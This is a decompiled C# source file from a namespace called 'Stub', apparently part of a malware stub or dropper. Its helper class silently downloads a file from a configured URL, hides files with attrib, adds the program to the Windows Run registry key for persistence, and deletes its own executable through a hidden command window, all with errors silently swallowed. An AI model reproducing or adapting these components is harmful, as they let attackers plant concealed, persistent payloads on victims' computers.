using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace Stub.Modules.InternalFuncs
{
	// Token: 0x02000008 RID: 8
	internal class InternalAux
	{
		// Token: 0x06000010 RID: 16 RVA: 0x000029E8 File Offset: 0x00000BE8
		public static string ReadRegistryValue(string keyName, string valueName)
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(keyName))
			{
				bool flag = registryKey != null;
				if (flag)
				{
					object value = registryKey.GetValue(valueName);
					bool flag2 = value != null;
					if (flag2)
					{
						return value.ToString();
					}
				}
			}
			return null;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002A50 File Offset: 0x00000C50
		public static void WriteRegistryValue(string keyName, string valueName, string data)
		{
			using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(keyName))
			{
				bool flag = registryKey != null;
				if (flag)
				{
					registryKey.SetValue(valueName, data);
				}
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002A9C File Offset: 0x00000C9C
		public static void DownloadFile()
		{
			bool flag = File.Exists(config.FileLocation);
			if (flag)
			{
				File.Delete(config.FileLocation);
			}
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile(config.Url, config.FileLocation);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002B14 File Offset: 0x00000D14
		public static void SelfRemove()
		{
			string fileName = Process.GetCurrentProcess().MainModule.FileName;
			string directoryName = Path.GetDirectoryName(fileName);
			string fileName2 = Path.GetFileName(fileName);
			string arguments = "/c timeout /t 1 && DEL /f " + fileName2 + " ";
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = "cmd",
				UseShellExecute = false,
				CreateNoWindow = true,
				Arguments = arguments,
				WorkingDirectory = directoryName
			};
			Process.Start(startInfo);
			Environment.Exit(0);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002B94 File Offset: 0x00000D94
		public static void HideFile(string fileLocation)
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c attrib +h \"" + fileLocation + "\"")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					RedirectStandardOutput = false,
					RedirectStandardError = false
				};
				using (Process process = Process.Start(startInfo))
				{
					process.WaitForExit();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002C20 File Offset: 0x00000E20
		public static void AddToAutoRun(string appName, string appPath)
		{
			try
			{
				string keyName = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
				string text = InternalAux.ReadRegistryValue(keyName, appName);
				bool flag = text == null;
				if (flag)
				{
					InternalAux.WriteRegistryValue(keyName, appName, appPath);
				}
			}
			catch
			{
			}
		}
	}
}
